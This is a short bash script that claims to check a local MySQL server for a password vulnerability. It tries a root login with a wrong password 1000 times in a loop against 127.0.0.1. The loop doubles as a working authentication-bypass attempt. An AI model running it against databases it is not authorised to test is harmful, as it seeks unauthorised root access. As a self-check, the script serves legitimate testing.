#!/bin/bash
echo "Checking for the mysql password vulnerability"
for i in `seq 1 1000`; do echo $i; mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done